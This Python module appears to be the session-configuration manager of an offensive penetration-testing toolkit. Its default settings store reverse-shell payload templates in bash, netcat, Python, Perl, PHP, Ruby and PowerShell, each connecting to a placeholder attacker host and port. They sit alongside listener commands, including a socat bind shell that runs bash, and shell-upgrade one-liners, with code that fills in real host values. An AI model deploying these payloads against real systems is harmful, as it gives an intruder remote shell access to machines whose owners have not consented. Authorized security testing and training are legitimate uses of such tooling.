"""
Session configuration management

Loads session-specific configuration from ~/.crack/config.json
Provides default values, templates, and variable substitution
"""

import json
from pathlib import Path
from typing import Dict, Any, Optional


class SessionConfig:
    """Configuration manager for session system

    Manages:
    - Default ports by protocol
    - Shell upgrade payload templates
    - Listener command templates
    - Timeout values
    - Variable substitution

    Configuration stored in ~/.crack/config.json under "sessions" key
    """

    # Default configuration values
    DEFAULT_CONFIG = {
        'default_ports': {
            'tcp': 4444,
            'http': 8080,
            'https': 443,
            'dns': 53,
            'icmp': None
        },
        'shell_upgrade_payloads': {
            'python_pty': 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
            'python2_pty': 'python -c "import pty; pty.spawn(\'/bin/bash\')"',
            'script': 'script /dev/null -c bash',
            'socat': 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>',
            'perl': 'perl -e \'exec "/bin/bash";\'',
            'ruby': 'ruby -e \'exec "/bin/bash"\'',
            'lua': 'lua -e \'os.execute("/bin/bash")\'',
            'expect': 'expect -c \'spawn /bin/bash; interact\''
        },
        'stabilization_commands': {
            'background': '^Z',  # Ctrl+Z
            'stty_raw': 'stty raw -echo; fg',
            'export_term': 'export TERM=xterm',
            'export_shell': 'export SHELL=/bin/bash',
            'stty_size': 'stty rows <ROWS> cols <COLS>',
            'reset': 'reset'
        },
        'listener_templates': {
            'netcat': 'nc -nlvp <PORT>',
            'netcat_traditional': 'nc -lvnp <PORT>',
            'socat': 'socat TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:/bin/bash',
            'socat_tty': 'socat TCP-LISTEN:<PORT>,reuseaddr,fork file:`tty`,raw,echo=0',
            'metasploit': 'use exploit/multi/handler\nset PAYLOAD <PAYLOAD>\nset LHOST <LHOST>\nset LPORT <PORT>\nrun',
            'pwncat': 'pwncat-cs -lp <PORT>',
            'starkiller': 'python3 -m http.server <PORT>'
        },
        'reverse_shell_payloads': {
            'bash_tcp': 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1',
            'bash_udp': 'bash -i >& /dev/udp/<LHOST>/<LPORT> 0>&1',
            'nc_mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> <LPORT> >/tmp/f',
            'nc_e': 'nc -e /bin/bash <LHOST> <LPORT>',
            'nc_c': 'nc -c bash <LHOST> <LPORT>',
            'python_socket': 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
            'perl': 'perl -e \'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\'',
            'php_exec': 'php -r \'$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/bash -i <&3 >&3 2>&3");\'',
            'ruby': 'ruby -rsocket -e\'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)\'',
            'powershell': '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        },
        'timeouts': {
            'connection': 30,     # seconds to wait for connection
            'upgrade': 60,        # seconds to wait for upgrade to complete
            'command': 10,        # seconds to wait for command response
            'stabilization': 45   # seconds to wait for stabilization
        },
        'auto_upgrade': True,
        'auto_stabilize': True,
        'storage_path': '~/.crack/sessions'
    }

    CONFIG_PATH = Path.home() / ".crack" / "config.json"

    def __init__(self, config_path: Optional[Path] = None):
        """Initialize configuration manager

        Args:
            config_path: Optional custom config path
        """
        self.config_path = config_path or self.CONFIG_PATH
        self._config = None
        self._load_config()

    def _load_config(self):
        """Load configuration from file"""
        if not self.config_path.exists():
            # Create default config
            self._create_default_config()

        try:
            with open(self.config_path, 'r') as f:
                content = f.read()
                if not content.strip():
                    # Empty file, create default config
                    self._create_default_config()
                    content = self.config_path.read_text()

                full_config = json.loads(content)

            # If sessions section missing or empty, add it via _create_default_config
            if 'sessions' not in full_config or not full_config.get('sessions'):
                self._create_default_config()
                # Reload after creating defaults
                with open(self.config_path, 'r') as f:
                    full_config = json.load(f)

            # Get sessions section or use defaults
            self._config = full_config.get('sessions', {})

            # Merge with defaults (defaults for missing keys)
            self._config = self._merge_configs(self.DEFAULT_CONFIG, self._config)

        except (json.JSONDecodeError, IOError) as e:
            print(f"Warning: Failed to load config: {e}. Using defaults.")
            self._config = self.DEFAULT_CONFIG.copy()

    def _merge_configs(self, defaults: Dict[str, Any], user: Dict[str, Any]) -> Dict[str, Any]:
        """Recursively merge user config with defaults

        Args:
            defaults: Default configuration
            user: User configuration

        Returns:
            Merged configuration
        """
        result = defaults.copy()

        for key, value in user.items():
            if key in result and isinstance(result[key], dict) and isinstance(value, dict):
                # Recursively merge dicts
                result[key] = self._merge_configs(result[key], value)
            else:
                # Override with user value
                result[key] = value

        return result

    def _create_default_config(self):
        """Create default configuration file"""
        self.config_path.parent.mkdir(parents=True, exist_ok=True)

        # Load existing config or create new
        full_config = {}
        if self.config_path.exists():
            try:
                with open(self.config_path, 'r') as f:
                    content = f.read()
                    if content.strip():  # Only parse if not empty
                        full_config = json.loads(content)
            except (json.JSONDecodeError, IOError):
                # If file is corrupt or empty, start fresh
                full_config = {}

        # Ensure basic structure exists
        if 'settings' not in full_config:
            full_config['settings'] = {}
        if 'variables' not in full_config:
            full_config['variables'] = {}

        # Add sessions section if not present (always add it, even if empty in file)
        if 'sessions' not in full_config or not full_config['sessions']:
            full_config['sessions'] = self.DEFAULT_CONFIG

        # Save
        with open(self.config_path, 'w') as f:
            json.dump(full_config, f, indent=2)

    def get_default_port(self, protocol: str) -> Optional[int]:
        """Get default port for protocol

        Args:
            protocol: Protocol name ('tcp', 'http', 'https', 'dns', 'icmp')

        Returns:
            Default port number or None
        """
        return self._config['default_ports'].get(protocol.lower())

    def get_upgrade_payload(self, method: str, **variables) -> Optional[str]:
        """Get shell upgrade payload with variable substitution

        Args:
            method: Upgrade method name
            **variables: Variables for substitution (LHOST, LPORT, etc.)

        Returns:
            Payload string with variables substituted, or None if method not found
        """
        template = self._config['shell_upgrade_payloads'].get(method)

        if not template:
            return None

        # Substitute variables
        return self._substitute_variables(template, variables)

    def get_stabilization_command(self, command: str, **variables) -> Optional[str]:
        """Get stabilization command with variable substitution

        Args:
            command: Command name
            **variables: Variables for substitution

        Returns:
            Command string with variables substituted
        """
        template = self._config['stabilization_commands'].get(command)

        if not template:
            return None

        return self._substitute_variables(template, variables)

    def get_listener_template(self, listener_type: str, **variables) -> Optional[str]:
        """Get listener command template with variable substitution

        Args:
            listener_type: Listener type ('netcat', 'socat', 'metasploit', etc.)
            **variables: Variables for substitution (PORT, LHOST, PAYLOAD, etc.)

        Returns:
            Listener command string, or None if type not found
        """
        template = self._config['listener_templates'].get(listener_type)

        if not template:
            return None

        return self._substitute_variables(template, variables)

    def get_reverse_shell_payload(self, payload_type: str, **variables) -> Optional[str]:
        """Get reverse shell payload with variable substitution

        Args:
            payload_type: Payload type ('bash_tcp', 'python_socket', etc.)
            **variables: Variables for substitution (LHOST, LPORT, etc.)

        Returns:
            Payload string with variables substituted
        """
        template = self._config['reverse_shell_payloads'].get(payload_type)

        if not template:
            return None

        return self._substitute_variables(template, variables)

    def _substitute_variables(self, template: str, variables: Dict[str, Any]) -> str:
        """Substitute variables in template

        Args:
            template: Template string with <VAR> placeholders
            variables: Variable values

        Returns:
            Template with substituted values
        """
        result = template

        # Substitute each variable
        for key, value in variables.items():
            placeholder = f"<{key.upper()}>"
            result = result.replace(placeholder, str(value))

        # Also try loading from main config variables
        result = self._load_global_variables(result)

        return result

    def _load_global_variables(self, template: str) -> str:
        """Load variables from global config (LHOST, LPORT, etc.)

        Args:
            template: Template string

        Returns:
            Template with global variables substituted
        """
        try:
            with open(self.config_path, 'r') as f:
                full_config = json.load(f)

            variables = full_config.get('variables', {})

            for var_name, var_data in variables.items():
                if isinstance(var_data, dict) and 'value' in var_data:
                    value = var_data['value']
                else:
                    value = var_data

                placeholder = f"<{var_name.upper()}>"
                template = template.replace(placeholder, str(value))

        except (json.JSONDecodeError, IOError, KeyError):
            pass

        return template

    def get_timeout(self, timeout_type: str) -> int:
        """Get timeout value

        Args:
            timeout_type: Timeout type ('connection', 'upgrade', 'command', 'stabilization')

        Returns:
            Timeout in seconds
        """
        return self._config['timeouts'].get(timeout_type, 30)

    def is_auto_upgrade_enabled(self) -> bool:
        """Check if auto upgrade is enabled

        Returns:
            True if auto upgrade enabled
        """
        return self._config.get('auto_upgrade', True)

    def is_auto_stabilize_enabled(self) -> bool:
        """Check if auto stabilization is enabled

        Returns:
            True if auto stabilization enabled
        """
        return self._config.get('auto_stabilize', True)

    def get_storage_path(self) -> Path:
        """Get session storage path

        Returns:
            Path to session storage directory
        """
        path_str = self._config.get('storage_path', '~/.crack/sessions')
        return Path(path_str).expanduser()

    def update_config(self, updates: Dict[str, Any]) -> bool:
        """Update configuration values

        Args:
            updates: Dictionary of configuration updates

        Returns:
            True if update successful
        """
        try:
            # Load full config
            full_config = {}
            if self.config_path.exists():
                with open(self.config_path, 'r') as f:
                    content = f.read()
                    if content.strip():
                        full_config = json.loads(content)

            # Ensure basic structure
            if 'sessions' not in full_config:
                full_config['sessions'] = self.DEFAULT_CONFIG.copy()
            if 'settings' not in full_config:
                full_config['settings'] = {}
            if 'variables' not in full_config:
                full_config['variables'] = {}

            # Merge updates
            full_config['sessions'] = self._merge_configs(
                full_config['sessions'],
                updates
            )

            # Save
            with open(self.config_path, 'w') as f:
                json.dump(full_config, f, indent=2)

            # Reload
            self._load_config()

            return True

        except (json.JSONDecodeError, IOError) as e:
            print(f"Error updating config: {e}")
            return False

    def list_upgrade_methods(self) -> list:
        """List available upgrade methods

        Returns:
            List of upgrade method names
        """
        return list(self._config['shell_upgrade_payloads'].keys())

    def list_listener_types(self) -> list:
        """List available listener types

        Returns:
            List of listener type names
        """
        return list(self._config['listener_templates'].keys())

    def list_reverse_shell_types(self) -> list:
        """List available reverse shell payload types

        Returns:
            List of payload type names
        """
        return list(self._config['reverse_shell_payloads'].keys())

    def get_config_dict(self) -> Dict[str, Any]:
        """Get full configuration as dictionary

        Returns:
            Configuration dictionary
        """
        return self._config.copy()

    def reset_to_defaults(self) -> bool:
        """Reset configuration to defaults

        Returns:
            True if reset successful
        """
        try:
            # Load full config
            with open(self.config_path, 'r') as f:
                full_config = json.load(f)

            # Replace sessions section
            full_config['sessions'] = self.DEFAULT_CONFIG

            # Save
            with open(self.config_path, 'w') as f:
                json.dump(full_config, f, indent=2)

            # Reload
            self._load_config()

            return True

        except (json.JSONDecodeError, IOError) as e:
            print(f"Error resetting config: {e}")
            return False
